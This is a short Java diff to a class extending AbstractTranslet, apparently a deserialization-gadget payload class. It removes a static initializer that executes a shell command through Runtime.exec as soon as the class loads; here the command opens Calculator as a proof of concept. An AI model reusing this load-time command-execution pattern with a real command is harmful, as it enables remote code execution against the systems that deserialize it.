@@ -15,15 +15,8 @@ public class CustomAbstractTranslet extends AbstractTranslet {
     public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
 
     }
-
     @Override
     public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
-
-    }
-    static {
-        try{
-            Runtime.getRuntime().exec(new String[]{"/bin/bash","-c","open /System/Applications/Calculator.app"});
-        }catch (Exception e){}
 
     }
 }
